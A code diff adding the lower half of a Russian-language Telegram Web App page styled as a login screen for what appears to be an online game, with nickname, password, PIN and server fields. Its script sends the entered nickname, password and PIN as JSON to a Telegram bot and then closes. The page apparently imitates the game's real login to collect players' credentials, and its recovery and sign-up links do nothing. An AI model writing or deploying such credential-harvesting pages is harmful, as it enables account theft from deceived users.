@@ -1,0 +1,106 @@
+<div class="input-wrapper">
+            <div class="input-label">Пин-код</div>
+            <input type="text" id="pin" placeholder="Пин-код отключен" disabled>
+        </div>
+        <label class="pin-checkbox">
+            У меня есть<br>пин-код
+            <input type="checkbox" id="hasPin" onchange="togglePin()">
+        </label>
+    </div>
+
+    <div class="form-group">
+        <div class="icon-box icon-green"><i class="fa-solid fa-bars"></i></div>
+        <div class="input-wrapper">
+            <div class="input-label">Выбор сервера</div>
+            <select id="server">
+                <option value="87 | PODOLSK">87 | PODOLSK</option>
+                <option value="01 | MOSCOW">01 | MOSCOW</option>
+                <option value="10 | SPB">10 | SPB</option>
+            </select>
+        </div>
+        <i class="fa-solid fa-caret-down" style="color: var(--accent-red);"></i>
+    </div>
+
+    <!-- Кнопка отправки -->
+    <button class="btn-main" onclick="sendData()">
+        Войти в аккаунт <i class="fa-solid fa-arrow-right"></i>
+    </button>
+
+    <div class="divider">или</div>
+
+    <!-- Ссылки -->
+    <div class="link-group">
+        <span><i class="fa-solid fa-lock" style="color: #f1c40f; margin-right: 10px;"></i> Восстановление пароля</span>
+        <i class="fa-solid fa-chevron-right" style="color: #555;"></i>
+    </div>
+
+    <div class="link-group">
+        <span><i class="fa-solid fa-file-lines" style="color: #f1c40f; margin-right: 10px;"></i> Создать новый аккаунт</span>
+        <i class="fa-solid fa-chevron-right" style="color: #555;"></i>
+    </div>
+
+    <!-- Социальные сети -->
+    <div class="socials">
+        <button class="social-btn btn-forum"><i class="fa-solid fa-bars"></i> ФОРУМ</button>
+        <button class="social-btn btn-vk"><i class="fa-brands fa-vk"></i> VK</button>
+        <button class="social-btn btn-tg"><i class="fa-brands fa-telegram"></i> TG</button>
+    </div>
+
+    <div class="footer-links">
+        <span>ДОНАТ</span>
+        <span>О ПРОЕКТЕ</span>
+    </div>
+    
+    <a href="#" class="support-link"><i class="fa-solid fa-circle-exclamation"></i> СЛУЖБА ПОДДЕРЖКИ</a>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand(); // Разворачиваем на весь экран
+
+        // Функция включения/выключения поля пин-кода
+        function togglePin() {
+            let hasPin = document.getElementById('hasPin').checked;
+            let pinInput = document.getElementById('pin');
+            if (hasPin) {
+                pinInput.disabled = false;
+                pinInput.placeholder = "Введите пин-код";
+                pinInput.focus();
+            } else {
+                pinInput.disabled = true;
+                pinInput.value = "";
+                pinInput.placeholder = "Пин-код отключен";
+            }
+        }
+
+        // Отправка данных в Python-бота
+        function sendData() {
+            let nick = document.getElementById('nickname').value;
+            let pass = document.getElementById('password').value;
+            let pin = document.getElementById('pin').value;
+            let server = document.getElementById('server').value;
+            let hasPin = document.getElementById('hasPin').checked;
+
+            if (nick === "" || pass === "") {
+                // В Telegram Web App лучше использовать встроенное окно, 
+                // но alert тоже сработает
+                tg.showAlert("Заполните ник и пароль!");
+                return;
+            }
+
+            let userData = {
+                action: "login",
+                nickname: nick,
+                password: pass,
+                server: server,
+                pin: hasPin ? pin : "Отключен"
+            };
+
+            // Отправляем JSON строку в бота
+            tg.sendData(JSON.stringify(userData));
+            
+            // Закрываем Web App
+            tg.close();
+        }
+    </script>
+</body>
+</html>
